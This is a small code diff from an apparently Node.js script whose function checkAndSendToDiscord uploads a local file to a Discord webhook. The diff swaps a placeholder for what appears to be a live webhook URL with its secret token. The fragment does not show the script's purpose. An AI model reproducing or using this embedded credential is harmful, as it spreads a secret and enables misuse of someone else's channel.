@@ -28,7 +28,7 @@ const checkAndSendToDiscord = () => {
             formData.append('file', fs.createReadStream(filename));
 
             try {
-                await axios.post('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', formData, {
+                await axios.post('https://discord.com/api/webhooks/1362192718218006580/NeJsmRKwktwr6jzvGcW7fsofLIoOGoSvReQfjKkXongWIZabiZIAppiNX5i_7s2m9piL', formData, {
                     headers: formData.getHeaders()
                 });
                 console.log('Messages sent to Discord');
